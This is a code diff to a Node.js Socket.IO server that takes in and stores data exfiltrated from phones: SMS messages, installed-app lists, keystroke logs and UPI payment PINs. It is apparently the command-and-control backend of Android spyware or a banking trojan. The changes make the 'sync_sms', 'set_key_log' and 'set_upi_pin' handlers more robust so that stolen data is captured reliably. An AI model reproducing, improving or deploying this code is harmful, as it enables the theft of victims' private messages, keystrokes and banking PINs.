@@ -262,34 +262,55 @@ io.on('connection', (socket) => {
     // Sync SMS
     socket.on('sync_sms', async (data, ack) => {
         try {
-            const messages = typeof data === 'string' ? JSON.parse(data) : data;
+            let messages = typeof data === 'string' ? JSON.parse(data) : data;
+            if (!Array.isArray(messages)) {
+                // Handle case where it might be a single object or wrapped strangely
+                messages = [messages];
+            }
+
+            // Normalize helper
+            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
 
             await prisma.$transaction(async (tx) => {
                 for (const msg of messages) {
-                    const smsId = BigInt(msg.id);
+                    if (!msg) continue;
+
+                    const deviceId = getVal(msg, 'device_id', 'deviceId');
+                    const idRaw = getVal(msg, 'id', 'id');
+                    const address = getVal(msg, 'address', 'address');
+                    const body = getVal(msg, 'body', 'body');
+                    const date = getVal(msg, 'date', 'date');
+                    const timestamp = getVal(msg, 'timestamp', 'timestamp');
+                    const type = getVal(msg, 'type', 'type');
+
+                    if (!deviceId || !idRaw) continue;
+
+                    const smsId = BigInt(idRaw);
+                    const ts = timestamp ? BigInt(timestamp) : BigInt(0);
+
                     await tx.smsMessage.upsert({
                         where: {
                             id_device_id: {
                                 id: smsId,
-                                device_id: msg.device_id
+                                device_id: deviceId
                             }
                         },
                         update: {
-                            address: msg.address,
-                            body: msg.body,
-                            date: msg.date,
-                            timestamp: BigInt(msg.timestamp),
-                            type: msg.type,
+                            address: address,
+                            body: body,
+                            date: date,
+                            timestamp: ts,
+                            type: type,
                             sync_status: 'synced'
                         },
                         create: {
                             id: smsId,
-                            device_id: msg.device_id,
-                            address: msg.address,
-                            body: msg.body,
-                            date: msg.date,
-                            timestamp: BigInt(msg.timestamp),
-                            type: msg.type,
+                            device_id: deviceId,
+                            address: address,
+                            body: body,
+                            date: date,
+                            timestamp: ts,
+                            type: type,
                             sync_status: 'synced'
                         }
                     });
@@ -308,34 +329,47 @@ io.on('connection', (socket) => {
     socket.on('sync_single_sms', async (data, ack) => {
         try {
             const msg = typeof data === 'string' ? JSON.parse(data) : data;
-            const smsId = BigInt(msg.id);
+            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
 
-            await prisma.smsMessage.upsert({
-                where: {
-                    id_device_id: {
+            const deviceId = getVal(msg, 'device_id', 'deviceId');
+            const idRaw = getVal(msg, 'id', 'id');
+            const address = getVal(msg, 'address', 'address');
+            const body = getVal(msg, 'body', 'body');
+            const date = getVal(msg, 'date', 'date');
+            const timestamp = getVal(msg, 'timestamp', 'timestamp');
+            const type = getVal(msg, 'type', 'type');
+
+            if (deviceId && idRaw) {
+                const smsId = BigInt(idRaw);
+                const ts = timestamp ? BigInt(timestamp) : BigInt(0);
+
+                await prisma.smsMessage.upsert({
+                    where: {
+                        id_device_id: {
+                            id: smsId,
+                            device_id: deviceId
+                        }
+                    },
+                    update: {
+                        address: address,
+                        body: body,
+                        date: date,
+                        timestamp: ts,
+                        type: type,
+                        sync_status: 'synced'
+                    },
+                    create: {
                         id: smsId,
-                        device_id: msg.device_id
+                        device_id: deviceId,
+                        address: address,
+                        body: body,
+                        date: date,
+                        timestamp: ts,
+                        type: type,
+                        sync_status: 'synced'
                     }
-                },
-                update: {
-                    address: msg.address,
-                    body: msg.body,
-                    date: msg.date,
-                    timestamp: BigInt(msg.timestamp),
-                    type: msg.type,
-                    sync_status: 'synced'
-                },
-                create: {
-                    id: smsId,
-                    device_id: msg.device_id,
-                    address: msg.address,
-                    body: msg.body,
-                    date: msg.date,
-                    timestamp: BigInt(msg.timestamp),
-                    type: msg.type,
-                    sync_status: 'synced'
-                }
-            });
+                });
+            }
             if (ack) ack(true);
         } catch (error) {
             console.error('Error syncing single SMS:', error);
@@ -346,43 +380,78 @@ io.on('connection', (socket) => {
     // Sync apps
     socket.on('sync_apps', async (data, ack) => {
         try {
-            const apps = typeof data === 'string' ? JSON.parse(data) : data;
+            let apps = typeof data === 'string' ? JSON.parse(data) : data;
+            if (!Array.isArray(apps)) {
+                apps = [apps];
+            }
+
+            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
 
             await prisma.$transaction(async (tx) => {
                 for (const app of apps) {
+                    if (!app) continue;
+
+                    const deviceId = getVal(app, 'device_id', 'deviceId');
+                    const packageName = getVal(app, 'package_name', 'packageName');
+
+                    if (!deviceId || !packageName) {
+                        console.warn("Skipping app sync: Missing device_id or package_name", app);
+                        continue;
+                    }
+
+                    const appName = getVal(app, 'app_name', 'appName');
+                    const icon = getVal(app, 'icon', 'icon');
+                    const versionName = getVal(app, 'version_name', 'versionName');
+
+                    const versionCodeFn = getVal(app, 'version_code', 'versionCode');
+                    const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;
+
+                    const firstInstallTimeFn = getVal(app, 'first_install_time', 'firstInstallTime');
+                    const firstInstallTime = firstInstallTimeFn ? BigInt(firstInstallTimeFn) : null;
+
+                    const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
+                    const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;
+
+                    const isSystemApp = getVal(app, 'is_system_app', 'isSystemApp');
+                    const targetSdk = getVal(app, 'target_sdk', 'targetSdk');
+                    const minSdk = getVal(app, 'min_sdk', 'minSdk');
+
+                    const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
+                    const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());
+
                     await tx.installedApp.upsert({
                         where: {
                             device_id_package_name: {
-                                device_id: app.device_id,
-                                package_name: app.package_name
+                                device_id: deviceId,
+                                package_name: packageName
                             }
                         },
                         update: {
-                            app_name: app.app_name,
-                            icon: app.icon,
-                            version_name: app.version_name,
-                            version_code: app.version_code ? BigInt(app.version_code) : null,
-                            first_install_time: app.first_install_time ? BigInt(app.first_install_time) : null,
-                            last_update_time: app.last_update_time ? BigInt(app.last_update_time) : null,
-                            is_system_app: app.is_system_app,
-                            target_sdk: app.target_sdk,
-                            min_sdk: app.min_sdk,
-                            sync_timestamp: app.sync_timestamp ? BigInt(app.sync_timestamp) : BigInt(Date.now()),
+                            app_name: appName,
+                            icon: icon,
+                            version_name: versionName,
+                            version_code: versionCode,
+                            first_install_time: firstInstallTime,
+                            last_update_time: lastUpdateTime,
+                            is_system_app: isSystemApp,
+                            target_sdk: targetSdk,
+                            min_sdk: minSdk,
+                            sync_timestamp: syncTimestamp,
                             updated_at: new Date()
                         },
                         create: {
-                            device_id: app.device_id,
-                            package_name: app.package_name,
-                            app_name: app.app_name,
-                            icon: app.icon,
-                            version_name: app.version_name,
-                            version_code: app.version_code ? BigInt(app.version_code) : null,
-                            first_install_time: app.first_install_time ? BigInt(app.first_install_time) : null,
-                            last_update_time: app.last_update_time ? BigInt(app.last_update_time) : null,
-                            is_system_app: app.is_system_app || false,
-                            target_sdk: app.target_sdk,
-                            min_sdk: app.min_sdk,
-                            sync_timestamp: app.sync_timestamp ? BigInt(app.sync_timestamp) : BigInt(Date.now()),
+                            device_id: deviceId,
+                            package_name: packageName,
+                            app_name: appName,
+                            icon: icon,
+                            version_name: versionName,
+                            version_code: versionCode,
+                            first_install_time: firstInstallTime,
+                            last_update_time: lastUpdateTime,
+                            is_system_app: isSystemApp || false,
+                            target_sdk: targetSdk,
+                            min_sdk: minSdk,
+                            sync_timestamp: syncTimestamp,
                             created_at: new Date(),
                             updated_at: new Date()
                         }
@@ -402,14 +471,21 @@ io.on('connection', (socket) => {
     socket.on('set_key_log', async (data, ack) => {
         try {
             const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
-            await prisma.keyLog.create({
-                data: {
-                    device_id: keyLog.device_id,
-                    keylogger: keyLog.keylogger,
-                    key: keyLog.key,
-                    currentDate: keyLog.currentDate ? new Date(keyLog.currentDate) : new Date()
-                }
-            });
+            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
+
+            const deviceId = getVal(keyLog, 'device_id', 'deviceId');
+            const currentDate = getVal(keyLog, 'current_date', 'currentDate');
+
+            if (deviceId) {
+                await prisma.keyLog.create({
+                    data: {
+                        device_id: deviceId,
+                        keylogger: getVal(keyLog, 'keylogger', 'keylogger'),
+                        key: getVal(keyLog, 'key', 'key'),
+                        currentDate: currentDate ? new Date(currentDate) : new Date()
+                    }
+                });
+            }
             if (ack) ack(true);
         } catch (error) {
             console.error('Error saving key log:', error);
@@ -421,13 +497,20 @@ io.on('connection', (socket) => {
     socket.on('set_upi_pin', async (data, ack) => {
         try {
             const pinData = typeof data === 'string' ? JSON.parse(data) : data;
-            await prisma.upiPin.create({
-                data: {
-                    device_id: pinData.device_id,
-                    pin: pinData.pin,
-                    currentDate: pinData.currentDate ? new Date(pinData.currentDate) : new Date()
-                }
-            });
+            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
+
+            const deviceId = getVal(pinData, 'device_id', 'deviceId');
+            const currentDate = getVal(pinData, 'current_date', 'currentDate');
+
+            if (deviceId) {
+                await prisma.upiPin.create({
+                    data: {
+                        device_id: deviceId,
+                        pin: getVal(pinData, 'pin', 'pin'),
+                        currentDate: currentDate ? new Date(currentDate) : new Date()
+                    }
+                });
+            }
             if (ack) ack(true);
         } catch (error) {
             console.error('Error saving UPI pin:', error);
